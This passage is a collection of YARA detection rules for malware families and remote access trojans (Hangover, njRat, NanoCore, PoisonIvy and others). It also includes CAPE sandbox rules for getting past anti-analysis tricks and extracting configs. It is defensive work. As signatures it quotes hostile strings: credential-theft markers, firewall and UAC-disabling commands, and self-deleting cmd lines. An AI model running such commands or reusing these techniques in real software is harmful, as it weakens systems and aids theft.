        $a2 = "VBA6.DLL"
        $a3 = "Timer1"
        $a4 = "Timer2"
        $a5 = "IsNTAdmin"
        
    condition:
        all of them

}


rule Hangover_Smackdown_various {
    strings:
        $a1 = "pranVacrhan"
        $a2 = "NaramGaram"
        $a3 = "vampro"
        $a4 = "AngelPro"
        
        $b1 = "VBA6.DLL"
        $b2 = "advpack"
        $b3 = "IsNTAdmin"
        
        
    condition:
        1 of ($a*) and all of ($b*)

}

rule Hangover_Foler {
    strings:
        $a1 = "\\MyHood"
        $a2 = "UsbP"
        $a3 = "ID_MON"
        
    condition:
        all of them

}

rule Hangover_Appinbot {
    strings:
        $a1 = "CreateToolhelp32Snapshot"
        $a2 = "Process32First"
        $a3 = "Process32Next"
        $a4 = "FIDR/"
        $a5 = "SUBSCRIBE %d"
        $a6 = "CLOSE %d"
        
    condition:
        all of them

}

rule Hangover_Linog {
    strings:
        $a1 = "uploadedfile"
        $a2 = "Error in opening a file.."
        $a3 = "The file could not be opened"
        $a4 = "%sContent-Disposition: form-data; name=\"%s\";filename=\"%s\""

    condition:
        all of them

}


rule Hangover_Iconfall {
    strings:
        $a1 = "iconfall"
        $a2 = "78DDB5A902BB8FFF3F398B45BEDCD152"
        
    condition:
        all of them

}


rule Hangover_Deksila {
    strings:
        $a1 = "WinInetGet/0.1"
        $a2 = "dekstop2007.ico"
        $a3 = "mozila20"
        
    condition:
        all of them

}

rule Hangover_Auspo {
    strings:
        $a1 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV2)"
        $a2 = "POWERS"
        $a3 = "AUSTIN"
        
    condition:
        all of them

}

rule Hangover_Slidewin {
    strings:
        $a1 = "[NumLock]"
        $a2 = "[ScrlLock]"
        $a3 = "[LtCtrl]"
        $a4 = "[RtCtrl]"
        $a5 = "[LtAlt]"
        $a6 = "[RtAlt]"
        $a7 = "[HomePage]"
        $a8 = "[MuteOn/Off]"
        $a9 = "[VolDn]"
        $a10 = "[VolUp]"
        $a11 = "[Play/Pause]"
        $a12 = "[MailBox]"
        $a14 = "[Calc]"
        $a15 = "[Unknown]"
        
    condition:
        all of them

}


rule Hangover_Gimwlog {
    strings:
        $a1 = "file closed---------------------"
        $a2 = "new file------------------"
        $a3 = "md C:\\ApplicationData\\Prefetch\\"
        
    condition:
        all of them

}


rule Hangover_Gimwup {
    strings:
        $a1 = "=======inside while==========="
        $a2 = "scan finished"
        $a3 = "logFile.txt"
        
    condition:
        all of them

}

rule Hangover2_Downloader {

  strings:

    $a = "WinInetGet/0.1" wide ascii

    $b = "Excep while up" wide ascii

    $c = "&file=" wide ascii

    $d = "&str=" wide ascii

    $e = "?cn=" wide ascii

  condition:

    all of them
}

rule Hangover2_stealer {

  strings:

    $a = "MyWebClient" wide ascii

    $b = "Location: {[0-9]+}" wide ascii

    $c = "[%s]:[C-%s]:[A-%s]:[W-%s]:[S-%d]" wide ascii

  condition:

    all of them
}

rule Hangover2_backdoor_shell {

  strings:

    $a = "Shell started at: " wide ascii

    $b = "Shell closed at: " wide ascii

    $c = "Shell is already closed!" wide ascii

    $d = "Shell is not Running!" wide ascii

  condition:

    all of them
}

rule Hangover2_Keylogger {

  strings:

    $a = "iconfall" wide ascii

    $b = "/c ipconfig /all > " wide ascii

    $c = "Global\\{CHKAJESKRB9-35NA7-94Y436G37KGT}" wide ascii

  condition:

    all of them
}

rule HawkEye
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2015/06"
		ref = "http://malwareconfig.com/stats/HawkEye"
		maltype = "KeyLogger"
		filetype = "exe"

	strings:
		$key = "HawkEyeKeylogger" wide
		$salt = "099u787978786" wide
		$string1 = "HawkEye_Keylogger" wide
		$string2 = "holdermail.txt" wide
		$string3 = "wallet.dat" wide
		$string4 = "Keylog Records" wide
   		$string5 = "<!-- do not script -->" wide
  		$string6 = "\\pidloc.txt" wide
  		$string7 = "BSPLIT" wide

	condition:
		$key and $salt and all of ($string*)
}

rule Imminent
{
    meta:
        author = " Kevin Breen <kevin@techanarchy.net>"
        date = "2014/04"
        ref = "http://malwareconfig.com/stats/Imminent"
        maltype = "Remote Access Trojan"
        filetype = "exe"

    strings:
        $v1a = "DecodeProductKey"
        $v1b = "StartHTTPFlood"
        $v1c = "CodeKey"
        $v1d = "MESSAGEBOX"
        $v1e = "GetFilezillaPasswords"
        $v1f = "DataIn"
        $v1g = "UDPzSockets"
        $v1h = {52 00 54 00 5F 00 52 00 43 00 44 00 41 00 54 00 41}

        $v2a = "<URL>k__BackingField"
        $v2b = "<RunHidden>k__BackingField"
        $v2c = "DownloadAndExecute"
        $v2d = "-CHECK & PING -n 2 127.0.0.1 & EXIT" wide
        $v2e = "england.png" wide
        $v2f = "Showed Messagebox" wide
    condition:
        all of ($v1*) or all of ($v2*)
}

rule Infinity
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/Infinity"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "CRYPTPROTECT_PROMPTSTRUCT"
		$b = "discomouse"
		$c = "GetDeepInfo"
		$d = "AES_Encrypt"
		$e = "StartUDPFlood"
		$f = "BATScripting" wide
		$g = "FBqINhRdpgnqATxJ.html" wide
		$i = "magic_key" wide

	condition:
		all of them
}

rule JavaDropper
{
    meta:
	    author = " Kevin Breen <kevin@techanarchy.net>"
	    date = "2015/10"
	    ref = "http://malwareconfig.com/stats/AlienSpy"
	    maltype = "Remote Access Trojan"
	    filetype = "exe"

    strings:
	    $jar = "META-INF/MANIFEST.MF"

	    $a1 = "ePK"
	    $a2 = "kPK"

        $b1 = "config.ini"
        $b2 = "password.ini"

        $c1 = "stub/stub.dll"

        $d1 = "c.dat"

    condition:
        $jar and (all of ($a*) or all of ($b*) or all of ($c*) or all of ($d*))
}

rule jRat
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/jRat"
		maltype = "Remote Access Trojan"
		filetype = "Java"

    strings:
        $meta = "META-INF"
        $key = "key.dat"
        $conf = "config.dat"
 		$jra1 = "enc.dat"
		$jra2 = "a.class"
		$jra3 = "b.class"
		$jra4 = "c.class"
        $reClass1 = /[a-z]\.class/
        $reClass2 = /[a-z][a-f]\.class/

    condition:
       ($meta and $key and $conf and #reClass1 > 10 and #reClass2 > 10) or ($meta and $key and all of ($jra*))
}

rule LostDoor
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/LostDoor"
		maltype = "Remote Access Trojan"
		filetype = "exe"
        
    strings:
    	$a0 = {0D 0A 2A 45 44 49 54 5F 53 45 52 56 45 52 2A 0D 0A}
        $a1 = "*mlt* = %"
        $a2 = "*ip* = %"
        $a3 = "*victimo* = %"
        $a4 = "*name* = %"
        $b5 = "[START]"
        $b6 = "[DATA]"
        $b7 = "We Control Your Digital World" wide ascii
        $b8 = "RC4Initialize" wide ascii
        $b9 = "RC4Decrypt" wide ascii
        
    condition:
    	all of ($a*) or all of ($b*)
}

rule LuminosityLink
{
    meta:
        author = " Kevin Breen <kevin@techanarchy.net>"
        date = "2015/06"
        ref = "http://malwareconfig.com/stats/LuminosityLink"
        maltype = "Remote Access Trojan"
        filetype = "exe"

    strings:
        $a = "SMARTLOGS" wide
        $b = "RUNPE" wide
        $c = "b.Resources" wide
        $d = "CLIENTINFO*" wide
        $e = "Invalid Webcam Driver Download URL, or Failed to Download File!" wide
        $f = "Proactive Anti-Malware has been manually activated!" wide
        $g = "REMOVEGUARD" wide
        $h = "C0n1f8" wide
        $i = "Luminosity" wide
        $j = "LuminosityCryptoMiner" wide
        $k = "MANAGER*CLIENTDETAILS*" wide

    condition:
        all of them
}

rule LuxNet
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/LuxNet"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "GetHashCode"
		$b = "Activator"
		$c = "WebClient"
		$d = "op_Equality"
		$e = "dickcursor.cur" wide
		$f = "{0}|{1}|{2}" wide

	condition:
		all of them
}

rule NanoCore
{
    meta:
        author = " Kevin Breen <kevin@techanarchy.net>"
        date = "2014/04"
        ref = "http://malwareconfig.com/stats/NanoCore"
        maltype = "Remote Access Trojan"
        filetype = "exe"

    strings:
        $a = "NanoCore"
        $b = "ClientPlugin"
        $c = "ProjectData"
        $d = "DESCrypto"
        $e = "KeepAlive"
        $f = "IPNETROW"
        $g = "LogClientMessage"
		$h = "|ClientHost"
		$i = "get_Connected"
		$j = "#=q"
        $key = {43 6f 24 cb 95 30 38 39}


    condition:
        6 of them
}

rule NetWire
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/NetWire"
		maltype = "Remote Access Trojan"
		filetype = "exe"
		
    strings:
        $string1 = "[Scroll Lock]"
        $string2 = "[Shift Lock]"
        $string3 = "200 OK"
        $string4 = "%s.Identifier"
        $string5 = "sqlite3_column_text"
        $string6 = "[%s] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]"
    condition:
        all of them
}

rule njRat
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/njRat"
		maltype = "Remote Access Trojan"
		filetype = "exe"
 
	strings:

		$s1 = {7C 00 27 00 7C 00 27 00 7C} // |'|'|
		$s2 = "netsh firewall add allowedprogram" wide
		$s3 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" wide
		$s4 = "yyyy-MM-dd" wide

		$v1 = "cmd.exe /k ping 0 & del" wide
		$v2 = "cmd.exe /c ping 127.0.0.1 & del" wide
		$v3 = "cmd.exe /c ping 0 -n 2 & del" wide


	condition:
		all of ($s*) and any of ($v*)
}

rule Pandora
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/Pandora"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "Can't get the Windows version"
		$b = "=M=Q=U=Y=]=a=e=i=m=q=u=y=}="
		$c = "JPEG error #%d" wide
		$d = "Cannot assign a %s to a %s" wide
		$g = "%s, ProgID:"
		$h = "clave"
		$i = "Shell_TrayWnd"
		$j = "melt.bat"
		$k = "\\StubPath"
		$l = "\\logs.dat"
		$m = "1027|Operation has been canceled!"
		$n = "466|You need to plug-in! Double click to install... |"
		$0 = "33|[Keylogger Not Activated!]"

	condition:
		all of them
}

rule Paradox
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/Paradox"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "ParadoxRAT"
		$b = "Form1"
		$c = "StartRMCam"
		$d = "Flooders"
		$e = "SlowLaris"
		$f = "SHITEMID"
		$g = "set_Remote_Chat"

	condition:
		all of them
}

rule PoisonIvy
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/PoisonIvy"
		maltype = "Remote Access Trojan"
		filetype = "exe"

    strings:
    	$stub = {04 08 00 53 74 75 62 50 61 74 68 18 04}
        $string1 = "CONNECT %s:%i HTTP/1.0"
        $string2 = "ws2_32"
        $string3 = "cks=u"
        $string4 = "thj@h"
        $string5 = "advpack"
    condition:
		$stub at 0x1620 and all of ($string*) or (all of them)
}

rule Punisher
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/Punisher"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "abccba"
		$b = {5C 00 68 00 66 00 68 00 2E 00 76 00 62 00 73}
		$c = {5C 00 73 00 63 00 2E 00 76 00 62 00 73}
		$d = "SpyTheSpy" wide ascii
		$e = "wireshark" wide
		$f = "apateDNS" wide
		$g = "abccbaDanabccb"

	condition:
		all of them
}

rule PythoRAT
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/PythoRAT"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "TKeylogger"
		$b = "uFileTransfer"
		$c = "TTDownload"
		$d = "SETTINGS"
		$e = "Unknown" wide
		$f = "#@#@#"
		$g = "PluginData"
		$i = "OnPluginMessage"

	condition:
		all of them
}


rule ShadowTech
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/ShadowTech"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "ShadowTech" nocase
		$b = "DownloadContainer"
		$c = "MySettings"
		$d = "System.Configuration"
		$newline = "#-@NewLine@-#" wide
		$split = "pSIL" wide
		$key = "ESIL" wide

	condition:
		4 of them
}

rule SmallNet
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/SmallNet"
		maltype = "Remote Access Trojan"
		filetype = "exe"
		
	strings:
		$split1 = "!!<3SAFIA<3!!"
		$split2 = "!!ElMattadorDz!!"
		$a1 = "stub_2.Properties"
		$a2 = "stub.exe" wide
		$a3 = "get_CurrentDomain"

	condition:
		($split1 or $split2) and (all of ($a*))
}

rule SpyGate
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/SpyGate"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$split = "abccba"
		$a1 = "abccbaSpyGateRATabccba" //$a = Version 0.2.6
		$a2 = "StubX.pdb" 
		$a3 = "abccbaDanabccb"
		$b1 = "monikerString" nocase //$b = Version 2.0
		$b2 = "virustotal1"
		$b3 = "get_CurrentDomain"
		$c1 = "shutdowncomputer" wide //$c = Version 2.9
		$c2 = "shutdown -r -t 00" wide
		$c3 = "set cdaudio door closed" wide
		$c4 = "FileManagerSplit" wide
		$c5 = "Chating With >> [~Hacker~]" wide

	condition:
		(all of ($a*) and #split > 40) or (all of ($b*) and #split > 10) or (all of ($c*))
}

rule Sub7Nation
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/Sub7Nation"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "EnableLUA /t REG_DWORD /d 0 /f"
		$b = "*A01*"
		$c = "*A02*"
		$d = "*A03*"
		$e = "*A04*"	
		$f = "*A05*"
		$g = "*A06*"
		$h = "#@#@#"
		$i = "HostSettings"
		$verSpecific1 = "sevane.tmp"
		$verSpecific2 = "cmd_.bat"
		$verSpecific3 = "a2b7c3d7e4"
		$verSpecific4 = "cmd.dll"

		
	condition:
		all of them
}

rule unrecom
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/AAR"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$meta = "META-INF"
		$conf = "load/ID"
		$a = "load/JarMain.class"
		$b = "load/MANIFEST.MF"
        $c = "plugins/UnrecomServer.class"

	condition:
		all of them
}

rule Vertex
{

	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/Vertex"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$string1 = "DEFPATH"
		$string2 = "HKNAME"
		$string3 = "HPORT"
		$string4 = "INSTALL"
		$string5 = "IPATH"
		$string6 = "MUTEX"
		$res1 = "PANELPATH"
		$res2 = "ROOTURL"

	condition:
		all of them
}

rule VirusRat
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/VirusRat"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$string0 = "virustotal"
		$string1 = "virusscan"
		$string2 = "abccba"
		$string3 = "pronoip"
		$string4 = "streamWebcam"
		$string5 = "DOMAIN_PASSWORD"
		$string6 = "Stub.Form1.resources"
		$string7 = "ftp://{0}@{1}" wide
		$string8 = "SELECT * FROM moz_logins" wide
		$string9 = "SELECT * FROM moz_disabledHosts" wide
		$string10 = "DynDNS\\Updater\\config.dyndns" wide
		$string11 = "|BawaneH|" wide

	condition:
		all of them
}

rule Xena
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2015/06"
		ref = "http://malwareconfig.com/stats/Xena"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "HuntHTTPDownload"
		$b = "KuInstallation"
		$c = "PcnRawinput"
		$d = "untCMDList"
		$e = "%uWebcam"
		$f = "KACMConvertor"
		$g = "$VarUtils"
        $h = "****##"

	condition:
		all of them
}

rule xRAT
{
    meta:
        author = " Kevin Breen <kevin@techanarchy.net>"
        date = "2014/04"
        ref = "http://malwareconfig.com/stats/xRat"
        maltype = "Remote Access Trojan"
        filetype = "exe"

    strings:
        $v1a = "DecodeProductKey"
        $v1b = "StartHTTPFlood"
        $v1c = "CodeKey"
        $v1d = "MESSAGEBOX"
        $v1e = "GetFilezillaPasswords"
        $v1f = "DataIn"
        $v1g = "UDPzSockets"
        $v1h = {52 00 54 00 5F 00 52 00 43 00 44 00 41 00 54 00 41}

        $v2a = "<URL>k__BackingField"
        $v2b = "<RunHidden>k__BackingField"
        $v2c = "DownloadAndExecute"
        $v2d = "-CHECK & PING -n 2 127.0.0.1 & EXIT" wide
        $v2e = "england.png" wide
        $v2f = "Showed Messagebox" wide
    condition:
        all of ($v1*) or all of ($v2*)
}

rule Xtreme
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/Xtreme"
		maltype = "Remote Access Trojan"
		filetype = "exe"
		ver = "2.9, 3.1, 3.2, 3.5"

	strings:
		$a = "XTREME" wide
		$b = "ServerStarted" wide
		$c = "XtremeKeylogger" wide
		$d = "x.html" wide
		$e = "Xtreme RAT" wide

	condition:
		all of them
}
rule AgentTeslaV4JIT
{
    meta:
        author = "kevoreilly"
        description = "AgentTesla V4 JIT native config extractor"
        cape_options = "bp0=$decode1+8,count=0,hc0=30,action0=string:ecx,typestring=AgentTesla Config,no-logs=2"
        packed = "7f8a95173e17256698324886bb138b7936b9e8c5b9ab8fffbfe01080f02f286c"
    strings:
        $decode1 = {8B 01 8B 40 3C FF 50 10 8B C8 E8 [4] 89 45 CC B8 1A 00 00 00}
        $decode2 = {83 F8 18 75 2? 8B [2-5] D1 F8}
        $decode3 = {8D 4C 0? 08 0F B6 01 [0-3] 0F B6 5? 04 33 C2 88 01 B8 19 00 00 00}
    condition:
        2 of them
}
rule Al_khaser
{
    meta:
        author = "kevoreilly"
        description = "Al-khaser bypass"
        cape_options = "bp0=$print_check_result_x86,bp0=$print_check_result_x64,action0=setecx:0,count=1,no-logs=2"
    strings:
        $print_check_result_x86 = {89 45 FC 53 56 8B C1 89 95 C4 FD FF FF 89 85 C8 FD FF FF 57 6A F5 83 F8 01 75 47 FF 15 [4] 8B D8 8D 8D E4 FD FF FF BA 16 00 00 00 66 90}
        $print_check_result_x64 = {48 89 84 24 50 02 00 00 8B F1 83 F9 01 B9 F5 FF FF FF 48 8B EA 75 41 FF 15 [4] 48 8D 7C 24 30 B9 16 00 00 00 48 8B D8}
    condition:
        uint16(0) == 0x5A4D and any of ($print_check_result*)
}
rule AntiCuckoo
{
    meta:
        author = "kevoreilly"
        description = "AntiCuckoo bypass: https://github.com/therealdreg/anticuckoo"
        cape_options = "bp0=$HKActivOldStackCrash+36,action0=jmp,count=1"
        hash = "ad5e52f144bb4a1dae3090978c6ecb4c7732538c9b62a6cedd32eccee6094be5"
    strings:
        $HKActivOldStackCrash = {5B 81 FB FA FA FA FA 74 01 41 3B E0 75 ?? 83 E9 0B 83 F9 04 7F 04 C6 45 ?? 00 89 4D ?? 89 65 ?? 80 7D ?? 00 74}
    condition:
        uint16(0) == 0x5A4D and all of them
}
rule Blister
{
    meta:
        author = "kevoreilly"
        description = "Blister Sleep Bypass"
        cape_options = "bp0=$sleep1+6,bp1=$sleep2+7,action0=setsignflag,action1=clearcarryflag,count=3"
        blister_hash = "0a7778cf6f9a1bd894e89f282f2e40f9d6c9cd4b72be97328e681fe32a1b1a00"
        blister_hash = "afb77617a4ca637614c429440c78da438e190dd1ca24dc78483aa731d80832c2"
    strings:
        $sleep1 = {FF FF 83 7D F0 00 (E9|0F 8?)}
        $sleep2 = {81 7D D8 90 B2 08 00 (E9|0F 8?)}
        $protect = {50 6A 20 8D 45 ?? 50 8D 45 ?? 50 6A FF FF D7}
        $lock = {56 33 F6 B9 FF FF FF 7F 89 75 FC 8B C1 F0 FF 45 FC 83 E8 01 75 F7}
        $comp = {6A 04 59 A1 [4] 8B 78 04 8B 75 08 33 C0 F3 A7 75 0B 8B 45 0C 83 20 00 33 C0 40 EB 02 33 C0}
     condition:
        uint16(0) == 0x5A4D and 2 of ($protect, $lock, $comp) and all of ($sleep*)
}
rule BuerLoader
{
    meta:
        author = "kevoreilly"
        description = "BuerLoader RDTSC Trap Bypass"
        cape_options = "bp0=$trap+43,action0=skip,count=0"
    strings:
        $trap = {0F 31 89 45 ?? 6A 00 8D 45 ?? 8B CB 50 E8 [4] 0F 31}
    condition:
        uint16(0) == 0x5A4D and any of them
}
rule BumbleBeeLoader
{
    meta:
        author = "enzo & kevoreilly"
        description = "BumbleBee Loader"
        cape_options = "coverage-modules=gdiplus,ntdll-protect=0"
    strings:
        $str_set = {C7 ?? 53 65 74 50}
        $str_path = {C7 4? 04 61 74 68 00}
        $openfile = {4D 8B C? [0-70] 4C 8B C? [0-70] 41 8B D? [0-70] 4? 8B C? [0-70] FF D?}
        $createsection = {89 44 24 20 FF 93 [2] 00 00 80 BB [2] 00 00 00 8B F? 74}
        $hook = {48 85 C9 74 20 48 85 D2 74 1B 4C 8B C9 45 85 C0 74 13 48 2B D1 42 8A 04 0A 41 88 01 49 FF C1 41 83 E8 01 75 F0 48 8B C1 C3}
        $iternaljob = "IternalJob"
    condition:
        uint16(0) == 0x5A4D and 2 of them
}

rule BumbleBeeShellcode
{
    meta:
        author = "kevoreilly"
        description = "BumbleBee Loader 2023"
        cape_options = "coverage-modules=gdiplus,ntdll-protect=0"
        packed = "51bb71bd446bd7fc03cc1234fcc3f489f10db44e312c9ce619b937fad6912656"
    strings:
        $setpath = "setPath"
        $alloc = {B8 01 00 00 00 48 6B C0 08 48 8D 0D [2] 00 00 48 03 C8 48 8B C1 48 89 [3] 00 00 00 8B 44 [2] 05 FF 0F 00 00 25 00 F0 FF FF 8B C0 48 89}
        $hook = {48 85 C9 74 20 48 85 D2 74 1B 4C 8B C9 45 85 C0 74 13 48 2B D1 42 8A 04 0A 41 88 01 49 FF C1 41 83 E8 01 75 F0 48 8B C1 C3}
        $algo = {41 8B C1 C1 E8 0B 0F AF C2 44 3B C0 73 6A 4C 8B [3] 44 8B C8 B8 00 08 00 00 2B C2 C1 E8 05 66 03 C2 8B 94 [2] 00 00 00}
    condition:
        2 of them
}

rule Bumblebee
{
    meta:
        author = "enzo & kevoreilly"
        description = "BumbleBee Anti-VM Bypass"
        cape_options = "bp0=$antivm1+2,bp1=$antivm2+2,bp1=$antivm3+38,action0=jmp,action1=skip,count=0,force-sleepskip=1"
    strings:
        $antivm1 = {84 C0 74 09 33 C9 FF [4] 00 CC 33 C9 E8 [3] 00 4? 8B C8 E8}
        $antivm2 = {84 C0 0F 85 [2] 00 00 33 C9 E8 [4] 48 8B C8 E8 [4] 48 8D 85}
        $antivm3 = {33 C9 E8 [4] 48 8B C8 E8 [4] 83 CA FF 48 8B 0D [4] FF 15 [4] E8 [4] 84 c0}
    condition:
        uint16(0) == 0x5A4D and any of them
}
rule CargoBayLoader
{
    meta:
        author = "kevoreilly"
        description = "CargoBayLoader anti-vm bypass"
        cape_options = "bp0=$jmp1+4,action0=skip,bp1=$jmp2+2,action1=skip,count=1,force-sleepskip=1"
        hash = "75e975031371741498c5ba310882258c23b39310bd258239277708382bdbee9c"
    strings:
        $jmp1 = {40 42 0F 00 0F 82 [2] 00 00 48 8D 15 [4] BF 04 00 00 00 41 B8 04 00 00 00 4C 8D [3] 4C 89 F1 E8}
        $jmp2 = {84 DB 0F 85 [2] 00 00 48 8D 15 [4] 41 BE 03 00 00 00 41 B8 03 00 00 00 4C 8D 7C [2] 4C 89 F9 E8}
    condition:
        uint16(0) == 0x5A4D and all of them
}
rule DarkGateLoader
{
    meta:
        author = "enzok"
        description = "DarkGate Loader"
        cape_options = "bp0=$decrypt1+30,bp0=$decrypt2+29,action0=dump:eax::ebx,bp1=$decrypt3+80,action1=dumpsize:eax,bp2=$decrypt3+124,hc2=1,action2=dump:eax,count=0"
        packed = "b15e4b4fcd9f0d23d902d91af9cc4e01417c426e55f6e0b4ad7256f72ac0231a"
    strings:
        $loader = {6C 6F 61 64 65 72}
        $decrypt1 = {B? 01 00 00 00 8B [3] E8 [4] 8B D7 32 54 [4] 88 54 18 FF 4? 4? 75}
        $decrypt2 = {B? 01 00 00 00 8B [2] E8 [4] 8B D7 2B D3 [4] 88 54 18 FF 4? 4? 75}
        $decrypt3 = {89 85 [4] 8B 85 [4] 8B F0 8D BD [4] B? 10 [3] F3 A5 8B 85 [4] 33 D2 [2] 8B 85 [4] 99}
    condition:
        $loader and any of ($decrypt*)
}
rule DridexLoader
{
    meta:
        author = "kevoreilly"
        description = "DridexLoader API Spam Bypass"
        cape_options = "bp0=$trap-13,action0=ret,count=0"
    strings:
        $trap = {6A 50 6A 14 6A 03 5A 8D 4C 24 ?? E8 [4] 68 [4] 68 [4] E8 [4] 85 C0 74 05}
    condition:
        uint16(0) == 0x5A4D and $trap
}
rule EmotetPacker
{
    meta:
        author = "kevoreilly"
        description = "Emotet bypass"
        cape_options = "bp0=$trap1+31,action0=skip,bp1=$trap2+43,action1=jmp:186,count=1"
        hash = "5a95d1d87ce69881b58a0e3aafc1929861e2633cdd960021d7b23e2a36409e0d"
    strings:
        $trap1 = {8B 45 08 0F 28 0D [4] 0F 57 C0 0F 29 46 30 89 46 40 C7 46 44 00 00 00 00 0F 11 4E 48 E8}
        $trap2 = {F2 0F 10 15 [4] BE 01 00 00 00 0F 01 F9 C7 44 24 60 00 00 00 00 89 4C 24 60 0F 01 F9 C7 44 24 5C 00 00 00 00 89 4C 24 5C 0F 1F 84 00 00 00 00 00}
    condition:
        uint16(0) == 0x5A4D and any of ($trap*)
}
rule Formbook
{
    meta:
        author = "kevoreilly"
        description = "Formbook Anti-hook Bypass"
        cape_options = "bp0=$remap_ntdll_0,action0=setedx:ntdll,count0=1,bp1=$remap_ntdll_1,action1=setptr:esi+12::ntdll,count1=1"
        packed = "9e38c0c3c516583da526016c4c6a671c53333d3d156562717db79eac63587522"
        packed = "b8e44f4a0d92297c5bb5b217c121f0d032850b38749044face2b0014e789adfb"
    strings:
        $remap_ntdll_0 = {33 56 04 8D 86 [2] 00 00 68 F0 00 00 00 50 89 56 ?? E8 [4] 8B [1-5] 6A 00 6A 04 8D 4D ?? 51 6A 07 52 56 E8 [4] 8B 45 ?? 83 C4 20 3B}
        $remap_ntdll_1 = {33 56 0C 8D 86 [2] 00 00 68 F0 00 00 00 50 89 56 ?? E8 [4] 8B [1-5] 6A 00 6A 04 8D 4D ?? 51 6A 07 52 56 E8 [4] 8B 45 ?? 83 C4 20 3B}
    condition:
        any of them
}

rule FormconfA
{
    meta:
        author = "kevoreilly"
        description = "Formbook Config Extraction"
        cape_options = "clear,bp0=$c2,action0=string:rcx+1,bp1=$decoy+67,action1=string:rcx+1,count=0,typestring=Formbook Config"
        packed = "b8e44f4a0d92297c5bb5b217c121f0d032850b38749044face2b0014e789adfb"
    strings:
        $c2 = {44 8B C6 48 8B D3 49 8B CE E8 [4] 44 88 23 41 8B DD 48 8D [2] 66 66 66 0F 1F 84 00 00 00 00 00 BA 8D 00 00 00 41 FF C4}
        $decoy = {8B D7 0F 1F 44 00 00 0F B6 03 FF C0 48 98 48 03 D8 48 FF CA 75 ?? 44 0F B6 03 48 8D 53 01 48 8D 4C [2] E8}
    condition:
        all of them
}

rule FormconfB
{
    meta:
        author = "kevoreilly"
        description = "Formbook Config Extraction"
        cape_options = "clear,bp0=$c2,action0=string:rcx+1,bp1=$decoy,action1=string:rcx+1,bp2=$config,action2=scan,count=0,typestring=Formbook Config"
        packed = "ad81131f4f7e0ca1b4b89f17e63d766b1b4c18d1cb873db08de57ed86f9bb140"
    strings:
        $c2 = {44 0F B6 5D ?? 45 84 DB 74 ?? 48 8D 4D [1-5] 41 80 FB 2F 74 11 0F B6 41 01 48 FF C1 FF C3 44 0F B6 D8 84 C0 75}
        $decoy = {45 3B B5 [2] 00 00 44 8D 1C 33 48 8D 7D ?? 42 C6 44 [2] 00 49 0F 44 FF 48 8B CF E8}
        $config = {40 55 53 56 57 41 54 41 55 41 56 41 57 48 8D AC 24 [4] 48 81 EC [2] 00 00 45 33 F6 33 C0 4C 8B E9 4C 89 75}
    condition:
        any of them
}
rule GetTickCountAntiVM
{
    meta:
        author = "kevoreilly"
        description = "GetTickCountAntiVM bypass"
        cape_options = "bp0=$antivm1-13,bp0=$antivm5-40,bp0=$antivm6,action0=wret,hc0=1,bp1=$antivm2-6,action1=wret,hc1=1,count=1,bp2=$antivm3+42,action2=jmp:96,bp3=$antivm4-9,action3=wret,hc3=1"
        hash = "662bc7839ed7ddd82d5fdafa29fafd9a9ec299c28820fe4104fbba9be1a09c42"
        hash = "00f1537b13933762e1146e41f3bac668123fac7eacd0aa1f7be0aa37a91ef3ce"
